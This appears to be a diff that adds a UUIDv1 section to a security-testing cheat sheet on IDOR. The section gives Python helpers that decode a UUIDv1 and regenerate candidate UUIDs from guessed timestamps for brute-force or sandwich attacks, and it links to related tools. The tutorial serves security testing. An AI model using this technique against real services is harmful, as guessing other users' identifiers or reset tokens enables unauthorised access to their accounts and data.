@@ -34,3 +34,55 @@ The best way to test for IDOR is to create two accounts, and see if from one, yo
 
 * Try not to follow redirects to see if you can exploit something.
 </div></div>
+
+<hr class="sep-both">
+
+## UUIDv1
+
+<div class="row row-cols-lg-2"><div>
+
+One very common alternative to integers is using UUID. UUIDv1 is well-known for being vulnerable to brute force/sandwich attack.
+
+```py
+import datetime
+import uuid
+
+def get_info(uuid_str):
+    uuid_obj = uuid.UUID(uuid_str)
+    timestamp = uuid_obj.time
+    clock_seq = f"{uuid_obj.clock_seq_hi_variant:02x}{uuid_obj.clock_seq_low:02x}".replace("0x", "")
+    node = f"{uuid_obj.node:012x}"
+    return timestamp, clock_seq, node, uuid_obj.version
+
+def get_uuid(timestamp, clock_seq, node, version):
+    hex_value = hex(timestamp)[2:]
+    hex_value = hex_value.zfill(12)
+    return f"{hex_value[7:]}-{hex_value[3:7]}-{version}{hex_value[0:3]}-{clock_seq}-{node}"
+
+def datetime_to_uuid_timestamp(date_str):
+    dt = datetime.datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S.%f")
+    reference_date = datetime.datetime(1582, 10, 15, 0, 0, 0)
+    delta = dt - reference_date
+    timestamp = int(delta.total_seconds() * 1e7)
+    return timestamp
+```
+</div><div>
+
+Assuming we have a UUIDv1, we can extract a few information:
+
+```py
+_, clock_seq, node, version = get_info("de8a7750-5691-11ef-9d01-0242ac11001a")
+```
+
+We then have to brute force the "time" at which the UUID was generated. Usually, if you have the time, you need to `+-10`.
+
+With the code above, you can generate a UUID given a time using:
+
+```py
+t = datetime_to_uuid_timestamp("2024-08-09 20:56:37.563784")
+uuid = get_uuid(t, clock_seq, node, version)
+print(uuid)
+```
+
+📚 See also the sandwich attack [here](https://securingbits.com/uuid-sandwich-attacks) and [here](https://github.com/AethliosIK/reset-tolkien) <small>(0.1k ⭐)</small>.
+</div></div>
